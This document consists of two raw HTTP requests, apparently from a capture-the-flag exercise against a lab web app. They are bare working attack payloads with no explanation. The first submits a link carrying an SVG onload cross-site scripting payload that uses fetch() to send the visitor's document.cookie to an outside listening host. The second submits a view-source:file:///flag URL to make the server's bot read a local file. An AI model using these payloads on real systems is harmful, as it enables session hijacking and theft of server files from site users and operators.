```
POST /submit HTTP/1.1
Host: 192.168.169.132:22225
Content-Length: 148
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.169.132:22225
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.169.132:22225/submit
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3Ao8N2OkcttuIpCuL-bHK0Q6imbl-z1ccS.BAcCWeKuGOZ7g9cJwxtKcPAYtoDhXmLZy3UXY9fP86A; a=b
Connection: close

link=<@urlencode>http://127.0.0.1:22225/api/test?key=%3Csvg%20onload=%22fetch(%27http://192.168.169.1:8000?%27%2bdocument.cookie)%22%3E<@/urlencode>
```


```
POST /submit HTTP/1.1
Host: 192.168.169.132:22225
Content-Length: 80
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.169.132:22225
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.169.132:22225/submit
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Cookie: connect.sid=s%3Ao8N2OkcttuIpCuL-bHK0Q6imbl-z1ccS.BAcCWeKuGOZ7g9cJwxtKcPAYtoDhXmLZy3UXY9fP86A; a=b
Connection: close

link=<@urlencode>view-source:file:///flag<@/urlencode>&archive=Y&secret=redacted
```